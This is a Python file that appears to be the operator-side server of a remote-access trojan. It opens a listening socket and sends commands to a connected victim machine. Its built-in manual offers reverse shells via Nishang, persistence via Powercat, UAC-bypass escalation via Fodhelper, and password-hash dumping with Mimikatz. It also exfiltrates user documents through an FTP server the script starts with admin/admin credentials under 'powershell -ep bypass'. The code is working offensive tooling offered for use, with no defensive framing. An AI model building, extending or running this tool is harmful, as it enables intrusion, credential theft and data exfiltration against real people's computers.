import os
import sys
import socket
import threading
from multiprocessing import Process
import time
from pathlib import Path
import subprocess


def manual():

    print("""
    
    
        Start Server: server.ext port ex: server.py/exe 1234
        
        Run Shell commands: shell command ex: shell, "whoami"
        
        Drop to proper shell (Nishang): rev-sh, LHOST, LPORT ex: rev-sh, 192.168.1.2, 4444
                            - 'exit' to quit client shell -
                            
        Create Persistence (Powercat): persist, LHOST, LPORT ex: persist, 192.168.1.2, 5555 
         
        Escalate Privilages (Fodhelper): escalate, LHOST, LPORT ex: escalate, 192.168.1.2, 6666
                        - 'quit' to quit client escalated shell -
                        
        Get password hashes (Admin): get-creds
        
        Get Password hashes (Mimikatz): mimikatz
        
        get computer info (Nishang): get-info
        
        get computer info (JuanMirandaBlitz): get2-info -- writes txt files, needs to be exfiltrated --
        
        Start FTP Server (for exfiltration): start-FTP
        
        Perform Exfiltration for txt, doc, docx, pdf from users dir: exfiltrate LHOST USER PASS 
                       -- ex: exfiltrate, 192.168.1.2, user, pass --
        
        
        """)


# DISPLAY MANUAL #
# manual()
# DISPLAY MANUAL #


try:
    PORT = sys.argv[1]
except:
    PORT = None
    print("Syntax: File PORT")
    sys.exit()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(('0.0.0.0', int(PORT)))
    print("# Socket bind successful #")
except socket.error as e:
    print("Socket bind failed", e)
    sys.exit()

try:
    s.listen()
    print("# Listening #")
except socket.error as e:
    print("# Failed to start server #", e)
    sys.exit()

c, addr = s.accept()
print('Got connection from', addr)


# while True:
#     msg = input("#:: ")
#     c.send(msg.encode())
#     print(c.recv(9096).decode())
#     if msg == "quit":
#         print("# Program Quit #")
#         sys.exit()


def start_ftp():
    cmd = "python -m pyftpdlib -i '0.0.0.0' -p 21 -w -u 'admin' -P 'admin'"
    full_cmd = "powershell -ep bypass -Command " + cmd
    subprocess.run(full_cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)


def send(conn_obj):
    global ftp
    while True:
        msg = input("#:: ")
        conn_obj.send(msg.encode())
        if msg == "quit":
            print("# Program Quit #")
            sys.exit()

        if "escalate" in msg:
            try:
                LHOST = str(msg.split(",")[1]).strip(" ")
                LPORT = str(msg.split(",")[2]).strip(" ")
            except:
                LHOST = None
                LPORT = None

            if LHOST and LPORT is not None:
                file_name = Path(__file__).name
                file_path = Path(__file__).parent.absolute()
                full_path = str(file_path) + "\\" + str(file_name)
                program = str('cmd start /c "python ' + full_path + ' ' + LPORT + '"').replace("\\", "\\\\")
                # print(program)
                subprocess.run(program)

        if "rev-sh" in msg:
            try:
                LHOST = str(msg.split(",")[1]).strip(" ")
                LPORT = str(msg.split(",")[2]).strip(" ")
            except:
                LHOST = None
                LPORT = None

            if LHOST and LPORT is not None:
                file_name = Path(__file__).name
                file_path = Path(__file__).parent.absolute()
                full_path = str(file_path) + "\\" + str(file_name)
                program = str('cmd start /c "python ' + full_path + ' ' + LPORT + '"').replace("\\", "\\\\")
                # print(program)
                subprocess.run(program)

        if "start-FTP" in msg:
            # start_ftp = ftp_srv()
            ftp = threading.Thread(target=start_ftp)
            ftp.start()
            # print("# FTP Server Started @ 0.0.0.0:21 #")

        if "help" in msg:
            manual()


def receive(conn_obj):
    while True:
        rec = conn_obj.recv(9096).decode()
        if not rec:
            sys.exit()
        else:
            print(rec)
            

t1 = threading.Thread(target=receive, args=(c,)).start()
send(c)
